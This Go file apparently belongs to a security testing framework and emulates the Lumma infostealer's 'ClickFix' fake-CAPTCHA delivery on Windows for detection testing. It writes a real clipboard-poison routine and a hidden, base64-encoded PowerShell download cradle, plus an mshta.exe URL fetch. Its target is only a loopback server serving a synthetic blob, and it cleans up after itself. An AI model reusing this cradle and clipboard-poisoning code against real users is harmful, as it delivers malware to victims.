// Stage 1 — T1204.002 / T1059.001 ClickFix Delivery: clipboard poison →
// hidden encoded PowerShell download cradle (+ mshta variant)
// F0RT1KA Security Testing Framework — Lumma-style infostealer emulation
//
// Emulates the delivery primitive documented for LummaC2 / Water Kurita
// ClickFix ("fake CAPTCHA") campaigns (NCC Group; Seqrite; BGD e-GOV CIRT;
// Sophos 2024-25; Microsoft 2026-03 wt.exe variant):
//
//  1. A fake-CAPTCHA page poisons the clipboard with a command the victim is
//     told to paste into Win+R. This stage writes that exact campaign-shaped
//     cradle string to the REAL clipboard via SetClipboardData (prior content
//     saved and restored afterwards — approved realism lift 2026-11-02).
//  2. The primitive is then executed the way the victim's Run dialog would:
//     powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand <b64>,
//     where the decoded script is the campaign cradle shape — a WebClient
//     download of the "next stage" saved to disk (Seqrite: g.exe pattern).
//  3. An mshta.exe http:// URL fetch variant is attempted for LOLBin telemetry
//     (Seqrite chain: mshta → VBScript → PowerShell).
//
// SAFETY:
//   - The cradle's URL points at a loopback receiver this stage starts on
//     127.0.0.1 (ephemeral port) — zero external egress.
//   - The "payload" served is a clearly-synthetic blob, never executed.
//   - Clipboard is saved before the poison write and restored in cleanup.
//
// EXIT CODES: 0 = cradle executed and staged the download; 126 = positive
// launch-denial evidence on powershell.exe/mshta.exe (Rule 8: numeric errno
// only); 999 = inconclusive/error.

//go:build windows
// +build windows

package main

import (
	"encoding/base64"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"
)

const (
	TEST_UUID      = "26a8b54e-b51c-489d-beae-295e1eecc524"
	TECHNIQUE_ID   = "T1204.002"
	TECHNIQUE_NAME = "ClickFix Delivery: Clipboard Poison to Encoded PowerShell Cradle (T1204.002 / T1059.001)"
	STAGE_ID       = 1
)

const (
	StageSuccess     = 0
	StageBlocked     = 126
	StageQuarantined = 105
	StageError       = 999
)

// synthetic payload bytes served at /p.exe — never executed, clearly marked.
var syntheticPayload = append([]byte("F0RT1KA-SYNTHETIC-LUMMA-STAGER-NOT-AN-EXECUTABLE-RUN-MARKER-"),
	make([]byte, 2048)...)

func main() {
	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Starting %s", TECHNIQUE_NAME))
	LogStageStart(STAGE_ID, TECHNIQUE_ID, TECHNIQUE_NAME)

	exitCode := performTechnique()

	switch exitCode {
	case StageSuccess:
		fmt.Printf("[STAGE %s] ClickFix cradle executed - download staged unimpeded\n", TECHNIQUE_ID)
		LogMessage("SUCCESS", TECHNIQUE_ID, "Encoded PowerShell cradle ran and staged the loopback download")
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success", "ClickFix delivery primitive executed without prevention")
	case StageBlocked:
		fmt.Printf("[STAGE %s] Delivery launcher refused (positive evidence)\n", TECHNIQUE_ID)
		LogMessage("BLOCKED", TECHNIQUE_ID, "powershell.exe/mshta.exe launch refused with protection errno")
		LogStageBlocked(STAGE_ID, TECHNIQUE_ID, "Delivery launcher launch refusal (numeric errno evidence)")
	default:
		fmt.Printf("[STAGE %s] Stage error - inconclusive\n", TECHNIQUE_ID)
		LogMessage("ERROR", TECHNIQUE_ID, "Delivery stage inconclusive or prerequisite failure")
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", "Stage error or inconclusive")
	}
	os.Exit(exitCode)
}

func performTechnique() int {
	injDir := filepath.Join(ARTIFACT_DIR, "lumma_inj")
	if err := os.MkdirAll(injDir, 0755); err != nil {
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("failed to create %s: %v", injDir, err))
		return StageError
	}
	stagedPath := filepath.Join(injDir, "lumma_stage2.bin")
	_ = os.Remove(stagedPath)

	// ------------------------------------------------------------------
	// Step 1: Loopback receiver (the "C2 staging" endpoint). Serves the
	// synthetic stager blob and a benign HTA document. 127.0.0.1 only.
	// ------------------------------------------------------------------
	listener, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("failed to bind loopback listener: %v", err))
		return StageError
	}
	defer listener.Close()

	var servedPayload, servedHTA int64
	mux := http.NewServeMux()
	mux.HandleFunc("/p.exe", func(w http.ResponseWriter, r *http.Request) {
		servedPayload += int64(len(syntheticPayload))
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Write(syntheticPayload)
	})
	mux.HandleFunc("/a.hta", func(w http.ResponseWriter, r *http.Request) {
		servedHTA++
		// Benign document, no script — mshta fetch telemetry only.
		w.Header().Set("Content-Type", "application/hta")
		io.WriteString(w, "<html><body>F0RT1KA SYNTHETIC HTA DOCUMENT</body></html>")
	})
	server := &http.Server{Handler: mux}
	go func() { _ = server.Serve(listener) }()
	defer server.Close()

	baseURL := fmt.Sprintf("http://%s", listener.Addr().String())

	// ------------------------------------------------------------------
	// Step 2: Clipboard poison (campaign artifact, real SetClipboardData).
	// Prior content saved for restore in cleanup.
	// ------------------------------------------------------------------
	psScript := fmt.Sprintf(`$u='%s/p.exe';$o=New-Object Net.WebClient;$d=$o.DownloadData($u);[IO.File]::WriteAllBytes('%s',$d)`,
		baseURL, stagedPath)
	enc := base64.StdEncoding.EncodeToString([]byte(utf16LE(psScript)))
	cradle := fmt.Sprintf("powershell -w hidden -enc %s", enc)

	fmt.Printf("[STAGE %s] Phase 1: poisoning clipboard with ClickFix cradle (%d chars)\n", TECHNIQUE_ID, len(cradle))
	saved := clipboardSave()
	restore := func() {
		fmt.Printf("[STAGE %s] cleanup: restoring prior clipboard content\n", TECHNIQUE_ID)
		clipboardRestore(saved)
	}
	if err := clipboardSetText(cradle); err != nil {
		// Headless/SSH sessions may lack a usable window station — the poison
		// attempt is telemetry; degradation is graceful, not an error.
		LogMessage("WARNING", TECHNIQUE_ID, fmt.Sprintf("clipboard poison not applied (session may be headless): %v", err))
	} else {
		LogMessage("INFO", TECHNIQUE_ID, "Clipboard poisoned with campaign-shaped cradle (SetClipboardData) - will be restored")
	}
	defer restore()

	// ------------------------------------------------------------------
	// Step 3: Execute the cradle exactly as the victim's Win+R would.
	// ------------------------------------------------------------------
	fmt.Printf("[STAGE %s] Phase 2: executing hidden encoded PowerShell cradle\n", TECHNIQUE_ID)
	LogMessage("INFO", TECHNIQUE_ID, "Launching powershell.exe -WindowStyle Hidden -EncodedCommand (T1059.001)")

	psArgs := []string{"-NoProfile", "-WindowStyle", "Hidden", "-EncodedCommand", enc}
	cmd := exec.Command("powershell.exe", psArgs...)
	out, runErr := cmd.CombinedOutput()
	outStr := strings.TrimSpace(string(out))
	LogProcessExecution("powershell.exe", "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand <b64:"+
		fmt.Sprintf("%d bytes>", len(enc)), 0, runErr == nil, exitCodeOf(runErr), outStr)

	if runErr != nil {
		if exitErr, ok := runErr.(*exec.ExitError); !ok {
			// Process never ran — classify by numeric errno only (Rule 8).
			// (classifyStageLaunchError's os.Stat quarantine check applies to
			// stage binaries, not system executables like powershell.exe.)
			code, why := classifySystemBinaryLaunch(runErr)
			LogMessage("WARN", TECHNIQUE_ID, fmt.Sprintf("powershell.exe launch outcome: %s", why))
			if code == StageBlocked {
				return StageBlocked
			}
			return StageError
		} else {
			LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("cradle PowerShell exited %d: %s", exitErr.ExitCode(), outStr))
			return StageError
		}
	}

	// ------------------------------------------------------------------
	// Step 4: Verify the staged download (cradle effect).
	// ------------------------------------------------------------------
	if info, serr := os.Stat(stagedPath); serr != nil || info.Size() != int64(len(syntheticPayload)) {
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("staged download missing/short after cradle (served=%d): %v", servedPayload, serr))
		return StageError
	}
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Cradle staged %d bytes from loopback staging URL (unexecuted)", len(syntheticPayload)))
	// Delivery evidence recorded — remove the staged blob (Tier-1 cleanup:
	// ARTIFACT_DIR restored on every exit path).
	if rerr := os.Remove(stagedPath); rerr == nil {
		LogMessage("INFO", TECHNIQUE_ID, "cleanup: staged download removed after verification")
	}

	// ------------------------------------------------------------------
	// Step 5: mshta http:// variant (secondary delivery LOLBin telemetry).
	// ------------------------------------------------------------------
	fmt.Printf("[STAGE %s] Phase 3: mshta.exe http fetch variant (telemetry)\n", TECHNIQUE_ID)
	htaCmd := exec.Command("mshta.exe", baseURL+"/a.hta")
	htaOut, htaErr := htaCmd.CombinedOutput()
	htaStr := strings.TrimSpace(string(htaOut))
	LogProcessExecution("mshta.exe", fmt.Sprintf("mshta.exe %s/a.hta", baseURL), 0, htaErr == nil, exitCodeOf(htaErr), htaStr)
	if htaErr != nil {
		if _, ok := htaErr.(*exec.ExitError); !ok {
			code, why := classifySystemBinaryLaunch(htaErr)
			LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("mshta launch outcome (non-fatal variant): %s", why))
			if code == StageBlocked {
				// Positive refusal to launch the LOLBin is prevention evidence
				// for the delivery objective.
				return StageBlocked
			}
		}
		// mshta exiting non-zero after fetching (render of benign doc) is not
		// evidence of prevention — the variant is secondary telemetry only.
		LogMessage("INFO", TECHNIQUE_ID, "mshta variant inconclusive (secondary) - primary cradle succeeded")
	} else {
		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("mshta fetched benign HTA (served=%d)", servedHTA))
	}

	LogMessage("CRITICAL", TECHNIQUE_ID, "Delivery primitive completed - encoded cradle staged payload from staging URL")
	return StageSuccess
}

func exitCodeOf(err error) int {
	if exitErr, ok := err.(*exec.ExitError); ok {
		return exitErr.ExitCode()
	}
	return 0
}

// classifySystemBinaryLaunch maps a failed launch of a SYSTEM executable
// (powershell.exe, mshta.exe — always present) to 126/999 by numeric errno
// only. No os.Stat quarantine check: it only applies to stage binaries.
func classifySystemBinaryLaunch(err error) (int, string) {
	var errno syscall.Errno
	if errorsAs(err, &errno) {
		return launchErrnoCode(launchGOOS, errno)
	}
	return 999, fmt.Sprintf("launch failed: %v (not a protection error)", err)
}

func errorsAs(err error, target *syscall.Errno) bool {
	if e, ok := err.(syscall.Errno); ok {
		*target = e
		return true
	}
	return false
}

// utf16LE encodes s as UTF-16LE bytes (PowerShell -EncodedCommand format).
func utf16LE(s string) []byte {
	runes := []rune(s)
	buf := make([]byte, len(runes)*2)
	for i, r := range runes {
		buf[i*2] = byte(r)
		buf[i*2+1] = byte(r >> 8)
	}
	return buf
}

// ============================================================================
// user32 clipboard helpers (real SetClipboardData / GetClipboardData API
// telemetry; graceful degradation when no window station is available).
// ============================================================================

var (
	user32             = syscall.NewLazyDLL("user32.dll")
	pOpenClipboard     = user32.NewProc("OpenClipboard")
	pCloseClipboard    = user32.NewProc("CloseClipboard")
	pEmptyClipboard    = user32.NewProc("EmptyClipboard")
	pGetClipboardData  = user32.NewProc("GetClipboardData")
	pSetClipboardData  = user32.NewProc("SetClipboardData")
	pIsFormatAvailable = user32.NewProc("IsClipboardFormatAvailable")
	pGlobalAlloc       = syscall.NewLazyDLL("kernel32.dll").NewProc("GlobalAlloc")
	pGlobalLock        = syscall.NewLazyDLL("kernel32.dll").NewProc("GlobalLock")
	pGlobalUnlock      = syscall.NewLazyDLL("kernel32.dll").NewProc("GlobalUnlock")
	pGlobalSize        = syscall.NewLazyDLL("kernel32.dll").NewProc("GlobalSize")
)

const (
	cfUnicodeText = 13
	gmemMoveable  = 0x0002
)

// clipboardSave snapshots the current CF_UNICODETEXT content ("" if absent).
func clipboardSave() string {
	if rv, _, _ := pIsFormatAvailable.Call(cfUnicodeText); rv == 0 {
		return ""
	}
	if rv, _, _ := pOpenClipboard.Call(0); rv == 0 {
		return ""
	}
	defer pCloseClipboard.Call()

	h, _, _ := pGetClipboardData.Call(cfUnicodeText)
	if h == 0 {
		return ""
	}
	size, _, _ := pGlobalSize.Call(h)
	if size == 0 {
		return ""
	}
	ptr, _, _ := pGlobalLock.Call(h)
	if ptr == 0 {
		return ""
	}
	defer pGlobalUnlock.Call(h)

	raw := unsafe.Slice((*uint16)(unsafe.Pointer(ptr)), size/2)
	runes := make([]rune, 0, len(raw))
	for _, u := range raw {
		if u == 0 {
			break
		}
		runes = append(runes, rune(u))
	}
	return string(runes)
}

// clipboardSetText writes s as CF_UNICODETEXT via the real API sequence
// OpenClipboard → EmptyClipboard → GlobalAlloc → SetClipboardData.
func clipboardSetText(s string) error {
	if rv, _, err := pOpenClipboard.Call(0); rv == 0 {
		return fmt.Errorf("OpenClipboard not available in this session: %v", err)
	}
	defer pCloseClipboard.Call()

	if rv, _, err := pEmptyClipboard.Call(); rv == 0 {
		return fmt.Errorf("EmptyClipboard returned failure: %v", err)
	}

	runes := []rune(s + "\x00")
	bytesLen := uintptr(len(runes)) * 2
	h, _, err := pGlobalAlloc.Call(gmemMoveable, bytesLen)
	if h == 0 {
		return fmt.Errorf("GlobalAlloc failed: %v", err)
	}
	ptr, _, err := pGlobalLock.Call(h)
	if ptr == 0 {
		return fmt.Errorf("GlobalLock failed: %v", err)
	}
	for i, r := range runes {
		*(*uint16)(unsafe.Pointer(ptr + uintptr(i*2))) = uint16(r)
	}
	pGlobalUnlock.Call(h)

	if rv, _, err := pSetClipboardData.Call(cfUnicodeText, h); rv == 0 {
		return fmt.Errorf("SetClipboardData returned failure: %v", err)
	}
	return nil
}

// clipboardRestore puts the saved text back (empty string restores empty).
func clipboardRestore(saved string) {
	if err := clipboardSetText(saved); err != nil {
		LogMessage("WARNING", TECHNIQUE_ID, fmt.Sprintf("clipboard restore not possible: %v", err))
	}
}
